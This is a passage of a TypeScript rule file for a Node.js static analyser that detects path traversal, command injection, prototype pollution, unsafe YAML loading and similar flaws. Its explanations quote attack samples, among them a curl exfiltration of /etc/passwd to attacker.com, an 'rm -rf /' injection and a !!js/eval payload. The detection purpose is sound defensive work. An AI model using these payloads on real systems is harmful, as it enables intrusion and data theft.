import type { ThesmosRule, DetectInput, Finding } from '../types';
import { classifySeverity } from '../severity';
import { SOURCE_EXT, SQL_EXT, isTestPath, isCommentLine } from './helpers';

export const NODE_RULES: ThesmosRule[] = [
  {
    id: 'NODE_001',
    category: 'path_traversal',
    description: 'File path constructed from user input without sanitization is a path traversal vulnerability.',
    severity: 'BLOCKER',
    tags: ['node', 'security', 'path-traversal'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'An attacker who controls any segment of a file path can use ../ sequences to read /etc/passwd, private keys, or database credentials outside the intended directory.',
      commonViolations: ['path.join(BASE_DIR, req.params.filename)', 'fs.readFile(req.query.file)'],
      goodExample: "const safeName = path.basename(req.params.filename);\nif (!safeName || safeName.startsWith('.')) throw new Error('Invalid filename');\nconst fullPath = path.join(BASE_DIR, safeName);",
      badExample: "const file = path.join(__dirname, 'uploads', req.params.name);  // ../../etc/passwd",
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('path_traversal', config.severityRules);
      const findings: Finding[] = [];
      const PATH_RE = /(?:path\.join|path\.resolve|path\.normalize)\s*\([^)]*(?:req\.|params\.|query\.|body\.)/;
      const FS_RE = /fs\.(?:readFile|writeFile|appendFile|createReadStream|createWriteStream|unlink|mkdir)\s*\(\s*(?:req\.|params\.|query\.|body\.)/;
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path) || isTestPath(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (PATH_RE.test(line) || FS_RE.test(line)) {
            if (!line.includes('basename') && !line.includes('sanitize')) {
              findings.push({ severity, category: 'path_traversal', file: path, line: i + 1, message: 'File path constructed from user input — path traversal vulnerability.', suggestion: "Sanitize with path.basename() and validate the result stays within the intended directory: path.join(BASE, basename)." });
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_002',
    category: 'insecure_random',
    description: 'Math.random() is not cryptographically secure — never use it for tokens, IDs, or security decisions.',
    severity: 'HIGH',
    tags: ['node', 'security', 'crypto'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Math.random() uses a predictable pseudo-random number generator. An attacker who can observe several outputs can predict future values. Use crypto.randomBytes() or crypto.randomUUID() for any security-sensitive purpose.',
      commonViolations: ['Math.random().toString(36)', 'const token = Math.random().toString(16)'],
      goodExample: "import { randomBytes, randomUUID } from 'node:crypto';\nconst token = randomBytes(32).toString('hex');\nconst id = randomUUID();",
      badExample: "const resetToken = Math.random().toString(36).slice(2);  // predictable — attacker can enumerate",
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('insecure_random', config.severityRules);
      const findings: Finding[] = [];
      const TOKEN_CONTEXT = /(?:token|secret|key|id|session|nonce|salt|otp|code|reset|verify|csrf)/i;
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/Math\.random\(\)/.test(line)) {
            const ctx = lines.slice(Math.max(0, i - 3), i + 3).join('\n');
            if (TOKEN_CONTEXT.test(ctx)) {
              findings.push({ severity, category: 'insecure_random', file: path, line: i + 1, message: 'Math.random() used in security-sensitive context — not cryptographically secure.', suggestion: "Use crypto.randomBytes(32).toString('hex') or crypto.randomUUID() instead." });
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_003',
    category: 'sync_fs_in_handler',
    description: 'Synchronous filesystem operations inside request handlers block the Node.js event loop.',
    severity: 'HIGH',
    tags: ['node', 'performance', 'reliability'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Node.js is single-threaded. fs.readFileSync() blocks all other I/O until complete. In a request handler, this stalls every concurrent connection for the duration of the file read.',
      commonViolations: ['fs.readFileSync(templatePath)', 'fs.writeFileSync(logPath, entry)'],
      goodExample: 'const content = await fs.promises.readFile(templatePath, "utf8")',
      badExample: "app.get('/report', (req, res) => { const data = fs.readFileSync('./data.json');  // blocks all other requests })",
      relatedPlaybooks: ['performance.md'],
      relatedAgents: [],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('sync_fs_in_handler', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/fs\.(?:readFileSync|writeFileSync|appendFileSync|existsSync|mkdirSync|readdirSync|statSync)\(/.test(line)) {
            const ctx = lines.slice(Math.max(0, i - 10), i + 1).join('\n');
            if (/app\.(?:get|post|put|delete|patch|use)|router\.|handler\s*=|async\s+function\s+handler/.test(ctx)) {
              findings.push({ severity, category: 'sync_fs_in_handler', file: path, line: i + 1, message: 'Synchronous fs operation inside a request handler — blocks the event loop.', suggestion: 'Use fs.promises.readFile() / fs.promises.writeFile() with await.' });
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_004',
    category: 'prototype_pollution_assign',
    description: 'Object.assign or spread of untrusted user input to objects with no prototype guard allows prototype pollution.',
    severity: 'BLOCKER',
    tags: ['node', 'security', 'prototype-pollution'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'If req.body contains { "__proto__": { "isAdmin": true } } and it is merged into a plain object, every object in the application gains isAdmin: true. This can bypass authorization checks or cause denial of service.',
      commonViolations: ['Object.assign({}, req.body)', 'const config = { ...defaults, ...req.body }'],
      goodExample: '// Validate with Zod before merging\nconst data = UserSchema.parse(req.body);\nconst config = { ...defaults, ...data };',
      badExample: 'const options = Object.assign({}, req.body);  // { "__proto__": {...} } pollutes prototype chain',
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('prototype_pollution_assign', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/Object\.assign\s*\(\s*\{[^}]*\}\s*,\s*(?:req\.|body\.|params\.|query\.)/.test(line) ||
              /\{\s*\.\.\.[^}]*(?:req|body|params|query)\.[^}]*\}/.test(line)) {
            findings.push({ severity, category: 'prototype_pollution_assign', file: path, line: i + 1, message: 'User input merged into object without prototype sanitization — prototype pollution risk.', suggestion: 'Validate input with Zod before merging. Never merge raw req.body into config objects.' });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_005',
    category: 'child_process_shell_injection',
    description: 'child_process with shell: true and user input is a command injection vulnerability.',
    severity: 'BLOCKER',
    tags: ['node', 'security', 'command-injection'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'When shell: true is set, the command is passed to /bin/sh. If any part of the command contains user input, an attacker can inject ; rm -rf / or | curl attacker.com/exfil?data=$(cat /etc/passwd).',
      commonViolations: ['exec(`git clone ${req.body.url}`, { shell: true })', 'spawn("bash", ["-c", userInput])'],
      goodExample: "// Use execFile with an array of args — no shell, no injection\nconst { stdout } = await execFile('git', ['clone', '--', sanitizedUrl]);",
      badExample: "exec(`convert ${req.files[0].path} output.png`, { shell: true })  // filename injection",
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('child_process_shell_injection', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/(?:exec|spawn|execSync|spawnSync)\s*\(/.test(line) && /shell\s*:\s*true/.test(line)) {
            findings.push({ severity, category: 'child_process_shell_injection', file: path, line: i + 1, message: 'child_process with shell: true — command injection if any argument is user-controlled.', suggestion: 'Use execFile() with explicit array arguments. Never set shell: true with user input.' });
          } else if (/(?:exec|execSync)\s*\(`[^`]*\$\{/.test(line)) {
            findings.push({ severity, category: 'child_process_shell_injection', file: path, line: i + 1, message: 'exec() with template literal — command injection if interpolated value is user-controlled.', suggestion: 'Switch to execFile(cmd, [arg1, arg2]) with an array of arguments to avoid shell interpretation.' });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_006',
    category: 'missing_request_timeout',
    description: 'HTTP server or outbound request without a timeout allows stalled connections to exhaust resources.',
    severity: 'HIGH',
    tags: ['node', 'reliability', 'performance'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'An outbound fetch/axios call with no timeout can hang indefinitely. Under load, all connection pool slots fill with hung requests. Always set a timeout — 5-30 seconds is typical for external APIs.',
      commonViolations: ['fetch(url)', 'axios.get(url)', 'http.request(options)'],
      goodExample: 'fetch(url, { signal: AbortSignal.timeout(10_000) })',
      badExample: 'const data = await fetch(externalApi + path);  // hangs forever if server is unresponsive',
      relatedPlaybooks: ['reliability.md'],
      relatedAgents: [],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('missing_request_timeout', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path) || isTestPath(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/\bfetch\s*\(\s*(?:url|endpoint|apiUrl|href|`|\w+Url)/.test(line)) {
            const next3 = lines.slice(i, Math.min(lines.length, i + 4)).join('\n');
            if (!next3.includes('timeout') && !next3.includes('signal') && !next3.includes('AbortSignal')) {
              findings.push({ severity, category: 'missing_request_timeout', file: path, line: i + 1, message: 'fetch() without a timeout — can hang indefinitely.', suggestion: 'Add signal: AbortSignal.timeout(10_000) to abort after 10 seconds.' });
            }
          } else if (/axios\.\w+\s*\(/.test(line)) {
            const next3 = lines.slice(i, Math.min(lines.length, i + 4)).join('\n');
            if (!next3.includes('timeout')) {
              findings.push({ severity, category: 'missing_request_timeout', file: path, line: i + 1, message: 'axios request without timeout — can hang indefinitely.', suggestion: 'Pass { timeout: 10000 } as axios config: axios.get(url, { timeout: 10000 }).' });
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_007',
    category: 'tls_verification_disabled',
    description: 'rejectUnauthorized: false or NODE_TLS_REJECT_UNAUTHORIZED=0 disables TLS certificate validation.',
    severity: 'BLOCKER',
    tags: ['node', 'security', 'tls'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Disabling TLS verification allows man-in-the-middle attacks. Any server with any certificate can impersonate your backend. This is almost never acceptable in production code and frequently slips from "temp fix" to permanent.',
      commonViolations: ['{ rejectUnauthorized: false }', 'NODE_TLS_REJECT_UNAUTHORIZED=0'],
      goodExample: '// Fix the certificate instead of disabling verification\n// Use a proper CA bundle or self-signed cert pinning',
      badExample: 'https.get(url, { rejectUnauthorized: false }, callback)  // MitM attack surface',
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('tls_verification_disabled', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path) && !path.endsWith('.env') && !path.endsWith('.sh')) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/rejectUnauthorized\s*:\s*false/.test(line) || /NODE_TLS_REJECT_UNAUTHORIZED\s*[=:]\s*['"]?0['"]?/.test(line)) {
            findings.push({ severity, category: 'tls_verification_disabled', file: path, line: i + 1, message: 'TLS certificate verification disabled — vulnerable to man-in-the-middle attacks.', suggestion: 'Fix the underlying certificate issue instead of disabling verification. Never ship rejectUnauthorized: false.' });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_008',
    category: 'jwt_algorithm_none',
    description: 'JWT verification without explicit algorithm restriction allows the "none" algorithm attack.',
    severity: 'BLOCKER',
    tags: ['node', 'security', 'jwt', 'auth'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'If jwt.verify() does not specify algorithms: ["HS256"], an attacker can forge a token with algorithm "none" and no signature. Many JWT libraries silently accept this if not restricted.',
      commonViolations: ['jwt.verify(token, secret)', 'jose.jwtVerify(token, secret)'],
      goodExample: "jwt.verify(token, secret, { algorithms: ['HS256'] })",
      badExample: "const payload = jwt.verify(token, secret);  // accepts 'none' algorithm forged tokens",
      relatedPlaybooks: ['auth.md'],
      relatedAgents: ['auth-reviewer', 'security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('jwt_algorithm_none', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/jwt\.verify\s*\(/.test(line) || /jwtVerify\s*\(/.test(line)) {
            const block = lines.slice(i, Math.min(lines.length, i + 3)).join('\n');
            if (!block.includes('algorithms') && !block.includes('algorithm')) {
              findings.push({ severity, category: 'jwt_algorithm_none', file: path, line: i + 1, message: 'JWT verify without explicit algorithm restriction — vulnerable to "none" algorithm attack.', suggestion: "Add { algorithms: ['HS256'] } (or RS256/ES256) as the third argument to jwt.verify()." });
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_009',
    category: 'cookie_no_secure_flags',
    description: 'Cookies set without Secure and HttpOnly flags are accessible to JavaScript and transmitted over HTTP.',
    severity: 'HIGH',
    tags: ['node', 'security', 'auth', 'cookies'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Without HttpOnly, any XSS can steal the cookie. Without Secure, the cookie transmits over HTTP connections (plain text). Session cookies must have both flags. SameSite: Strict/Lax protects against CSRF.',
      commonViolations: ["res.cookie('session', token)", "res.setHeader('Set-Cookie', `session=${token}`)"],
      goodExample: "res.cookie('session', token, { httpOnly: true, secure: true, sameSite: 'strict', maxAge: 3600000 })",
      badExample: "res.cookie('session', token)  // readable by JS, sent over HTTP",
      relatedPlaybooks: ['auth.md'],
      relatedAgents: ['auth-reviewer', 'security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('cookie_no_secure_flags', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/res\.cookie\s*\(/.test(line)) {
            const block = lines.slice(i, Math.min(lines.length, i + 5)).join('\n');
            if (!block.includes('httpOnly') || !block.includes('secure')) {
              findings.push({ severity, category: 'cookie_no_secure_flags', file: path, line: i + 1, message: 'Cookie set without httpOnly and/or secure flags.', suggestion: "Add { httpOnly: true, secure: true, sameSite: 'strict' } to all res.cookie() calls." });
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_010',
    category: 'stream_no_error_handler',
    description: 'Node.js streams without an "error" event handler cause unhandled exceptions that crash the process.',
    severity: 'HIGH',
    tags: ['node', 'reliability', 'streams'],
    sinceVersion: '3.0.0',
    explain: {
      why: "Streams that encounter errors emit an 'error' event. Without a listener, this becomes an uncaughtException that crashes Node.js. Always attach .on('error', handler) to every stream.",
      commonViolations: ['fs.createReadStream(path).pipe(res)', 'readableStream.pipe(writableStream)'],
      goodExample: "const readable = fs.createReadStream(path);\nreadable.on('error', (err) => { logger.error(err); res.status(500).end(); });\nreadable.pipe(res);",
      badExample: "fs.createReadStream(filePath).pipe(res);  // error → unhandled exception → process crash",
      relatedPlaybooks: ['reliability.md'],
      relatedAgents: [],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('stream_no_error_handler', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/\.pipe\s*\(/.test(line) || /createReadStream|createWriteStream/.test(line)) {
            const block = lines.slice(Math.max(0, i - 2), Math.min(lines.length, i + 5)).join('\n');
            if (!block.includes(".on('error'") && !block.includes('.on("error"') && !block.includes('pipeline(')) {
              findings.push({ severity, category: 'stream_no_error_handler', file: path, line: i + 1, message: 'Stream without .on("error") handler — errors crash the process.', suggestion: "Add .on('error', handler) to every stream, or use stream.pipeline() which handles errors automatically." });
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_011',
    category: 'event_listener_leak',
    description: 'Adding event listeners inside request handlers without removing them is a memory leak.',
    severity: 'HIGH',
    tags: ['node', 'reliability', 'memory'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Listeners added with emitter.on() persist until explicitly removed. Adding one per request means the listener count grows with each request until Node.js warns about MaxListenersExceededWarning and memory exhausts.',
      commonViolations: ['process.on("message", handler)  // inside request handler', 'emitter.on("event", fn)  // inside loop'],
      goodExample: '// Add once at startup, not per-request:\nprocess.on("message", handleMessage);  // outside handler\n// Inside handler if necessary: emitter.once("event", fn) or remove in cleanup',
      badExample: "app.get('/sse', (req, res) => { eventBus.on('data', (d) => res.write(d)); });  // listener never removed",
      relatedPlaybooks: ['reliability.md'],
      relatedAgents: [],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('event_listener_leak', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/\.on\s*\(\s*['"][^'"]+['"]\s*,/.test(line) && !line.includes('.once(') && !line.includes('removeListener') && !line.includes('off(')) {
            const ctx = lines.slice(Math.max(0, i - 8), i + 1).join('\n');
            if (/app\.\w+\s*\(|router\.\w+\s*\(|handler\s*=\s*async|async function handler/.test(ctx)) {
              findings.push({ severity, category: 'event_listener_leak', file: path, line: i + 1, message: 'Event listener added inside request handler — memory leak without cleanup.', suggestion: 'Use .once() for single-use listeners, or add listeners once at startup with removeListener() in cleanup.' });
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_012',
    category: 'process_exit_in_handler',
    description: 'process.exit() inside a request handler terminates the server for all concurrent users.',
    severity: 'HIGH',
    tags: ['node', 'reliability'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'process.exit() is a hard crash. Calling it inside an async handler (even intentionally) kills the Node.js process, terminating all in-flight requests. Use throw new Error() or res.status(500).end() instead.',
      commonViolations: ['process.exit(1)  // inside route handler', 'if (!config) process.exit(1)'],
      goodExample: 'if (!config) throw new Error("Missing config — startup failed");',
      badExample: "app.get('/health', (req, res) => { if (!db.connected) process.exit(1); })  // kills all users",
      relatedPlaybooks: ['reliability.md'],
      relatedAgents: [],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('process_exit_in_handler', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/process\.exit\s*\(/.test(line)) {
            const ctx = lines.slice(Math.max(0, i - 10), i + 1).join('\n');
            if (/app\.\w+\s*\(|router\.\w+\s*\(|async function handler|export.*function/.test(ctx)) {
              findings.push({ severity, category: 'process_exit_in_handler', file: path, line: i + 1, message: 'process.exit() inside a handler — kills the server for all concurrent users.', suggestion: 'Throw an Error or return an error response instead of calling process.exit().' });
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_013',
    category: 'missing_body_size_limit',
    description: 'HTTP servers parsing request bodies without a size limit allow unbounded payload DoS.',
    severity: 'HIGH',
    tags: ['node', 'security', 'dos'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Express body-parser defaults to 100KB. JSON bodies of 10MB or larger can exhaust memory in concurrent scenarios. Always configure a size limit appropriate to your API.',
      commonViolations: ['express.json()', 'app.use(express.json())', 'bodyParser.json()'],
      goodExample: "app.use(express.json({ limit: '1mb' }))",
      badExample: "app.use(express.json());  // default 100KB — may be too large or too small depending on use case",
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: [],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('missing_body_size_limit', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/express\.json\(\)|bodyParser\.json\(\)/.test(line) && !line.includes('limit')) {
            findings.push({ severity, category: 'missing_body_size_limit', file: path, line: i + 1, message: 'JSON body parser without explicit size limit.', suggestion: "Add limit: '1mb' (or appropriate value): express.json({ limit: '1mb' })." });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_014',
    category: 'open_redirect',
    description: 'Redirecting to a user-supplied URL without validation enables phishing attacks.',
    severity: 'HIGH',
    tags: ['node', 'security', 'redirect'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'An open redirect at yourapp.com/redirect?to=https://evil.com/ allows phishing emails to use your domain as a trusted relay. Always validate the redirect destination against an allowlist of known internal paths.',
      commonViolations: ['res.redirect(req.query.returnUrl)', 'res.redirect(req.body.next)'],
      goodExample: "const url = new URL(req.query.returnUrl ?? '/', process.env.APP_URL);\nif (url.origin !== process.env.APP_URL) return res.redirect('/');\nres.redirect(url.toString());",
      badExample: "res.redirect(req.query.returnUrl);  // ?returnUrl=https://evil.com — phishing relay",
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('open_redirect', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/res\.redirect\s*\(\s*(?:req\.|body\.|params\.|query\.)/.test(line)) {
            findings.push({ severity, category: 'open_redirect', file: path, line: i + 1, message: 'Redirect to user-supplied URL without validation — open redirect vulnerability.', suggestion: 'Validate the URL origin matches your APP_URL before redirecting. Reject external origins.' });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_015',
    category: 'yaml_unsafe_load',
    description: 'yaml.load() (js-yaml) executes JavaScript functions embedded in YAML — use yaml.safeLoad() or yaml.load() with schema.',
    severity: 'BLOCKER',
    tags: ['node', 'security', 'deserialization'],
    sinceVersion: '3.0.0',
    explain: {
      why: "js-yaml's yaml.load() with DEFAULT_FULL_SCHEMA can instantiate JavaScript objects via !!js/eval. If parsing untrusted YAML, this is remote code execution. Use yaml.load(content, { schema: yaml.JSON_SCHEMA }) or loadAll with SAFE_SCHEMA.",
      commonViolations: ['yaml.load(fs.readFileSync(configFile))', 'yaml.load(req.body.config)'],
      goodExample: "yaml.load(content, { schema: yaml.JSON_SCHEMA })  // no !!js/ types",
      badExample: "const config = yaml.load(req.body.yaml);  // !!js/eval: 'process.mainModule.require(\"child_process\").exec(\"curl...\")'",
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('yaml_unsafe_load', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/yaml\.load\s*\(/.test(line) && !line.includes('schema:') && !line.includes('SAFE_SCHEMA') && !line.includes('JSON_SCHEMA')) {
            findings.push({ severity, category: 'yaml_unsafe_load', file: path, line: i + 1, message: 'yaml.load() without schema restriction — can execute embedded JS functions.', suggestion: "Use yaml.load(content, { schema: yaml.JSON_SCHEMA }) to prevent JS type execution." });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_016',
    category: 'regex_denial_of_service',
    description: 'Regex patterns with catastrophic backtracking applied to untrusted input cause ReDoS.',
    severity: 'HIGH',
    tags: ['node', 'security', 'performance', 'redos'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Patterns like (a+)+ or \\s*,\\s* applied to adversarial input cause exponential backtracking. Node.js is single-threaded — one 100ms regex hang blocks all concurrent requests.',
      commonViolations: ['/(a+)+/.test(userInput)', '/^(\\d+\\.)+\\d+$/.test(version)'],
      goodExample: '// Use linear-complexity alternatives or bound input length first:\nif (input.length > 100) return false;\nreturn SAFE_RE.test(input);',
      badExample: '/^([a-zA-Z0-9_-]+\\.)*[a-zA-Z0-9_-]+$/.test(req.headers.host)  // ReDoS on crafted input',
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('regex_denial_of_service', config.severityRules);
      const findings: Finding[] = [];
      const REDOS_PATTERNS = [
        /\([^)]+\+\)\+/,   // (a+)+
        /\([^)]+\*\)\*/,   // (a*)*
        /\([^)]+\+\)\*/,   // (a+)*
        /\([^)]*\[.*\].*\+\)\+/, // ([a-z]+)+
      ];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          for (const pattern of REDOS_PATTERNS) {
            if (pattern.test(line)) {
              const ctx = lines.slice(Math.max(0, i - 5), i + 3).join('\n');
              if (/req\.|body\.|params\.|query\.|input\.|user/.test(ctx)) {
                findings.push({ severity, category: 'regex_denial_of_service', file: path, line: i + 1, message: 'Potentially catastrophic regex backtracking on user-controlled input — ReDoS risk.', suggestion: 'Rewrite the regex to avoid nested quantifiers, or cap input length before matching.' });
                break;
              }
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_017',
    category: 'missing_rate_limit',
    description: 'Auth endpoints (login, register, password reset) without rate limiting are vulnerable to brute force.',
    severity: 'HIGH',
    tags: ['node', 'security', 'auth', 'rate-limit'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Without rate limiting, automated tools can try millions of password combinations per minute. NIST recommends locking accounts or exponentially backing off after 5-10 failed attempts.',
      commonViolations: ["app.post('/login', authHandler)", "app.post('/reset-password', resetHandler)"],
      goodExample: "app.post('/login', rateLimit({ windowMs: 15*60*1000, max: 10 }), authHandler)",
      badExample: "app.post('/login', async (req, res) => { /* no rate limiting */ })",
      relatedPlaybooks: ['auth.md'],
      relatedAgents: ['auth-reviewer', 'security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('missing_rate_limit', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        if (content.includes('rateLimit') || content.includes('rate_limit') || content.includes('rateLimiter')) return findings;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/(?:app|router)\.post\s*\(\s*['"]\/(?:login|signin|sign-in|register|signup|sign-up|reset-password|forgot-password|verify)/.test(line)) {
            findings.push({ severity, category: 'missing_rate_limit', file: path, line: i + 1, message: 'Auth endpoint without rate limiting — brute-force vulnerable.', suggestion: 'Add express-rate-limit middleware: app.use("/login", rateLimit({ windowMs: 15*60*1000, max: 10 })).' });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_018',
    category: 'helmet_missing',
    description: 'Express apps without Helmet are missing security headers (CSP, HSTS, X-Frame-Options).',
    severity: 'HIGH',
    tags: ['node', 'security', 'http-headers'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Without security headers, browsers permit clickjacking, MIME sniffing, and cross-site scripting in some contexts. Helmet sets 15 headers with sensible defaults in one line.',
      commonViolations: ['express() without app.use(helmet())'],
      goodExample: "import helmet from 'helmet';\napp.use(helmet());",
      badExample: "const app = express();  // no helmet — missing CSP, HSTS, X-Frame-Options",
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('helmet_missing', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        if (!content.includes('express()') && !content.includes('express(')) return findings;
        if (content.includes('helmet')) return findings;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (/const\s+app\s*=\s*express\(\)/.test(line)) {
